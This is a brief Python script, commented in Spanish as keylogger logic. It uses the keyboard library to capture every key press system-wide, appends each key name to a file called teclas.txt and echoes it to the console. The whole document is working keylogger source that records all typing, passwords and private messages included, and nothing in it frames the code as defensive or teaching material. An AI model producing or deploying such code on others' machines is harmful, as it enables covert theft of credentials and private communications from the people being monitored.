import keyboard

# Lógica del keylogger
def pulsacionTeclas(teclas):
    with open("teclas.txt", "a") as file:
        file.write(teclas.name + '\n')
        print(' | ' + teclas.name + ' | ')
keyboard.on_press(pulsacionTeclas)
keyboard.wait()